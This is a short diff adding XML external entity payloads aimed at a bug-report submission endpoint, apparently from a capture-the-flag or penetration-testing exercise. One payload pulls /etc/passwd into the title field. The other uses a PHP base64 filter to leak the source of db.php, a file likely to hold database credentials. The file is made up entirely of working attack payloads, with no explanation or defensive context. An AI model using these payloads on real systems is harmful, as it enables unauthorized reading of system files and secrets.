@@ -1,0 +1,13 @@
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+		<bugreport>
+		<title>&xxe;</title>
+		<cwe>1</cwe>
+		<cvss>1</cvss>
+		<reward>1</reward>
+		</bugreport>
+
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
+		<bugreport>
+		<title>&xxe;</title>
+		<cwe>&xxe;</cwe>
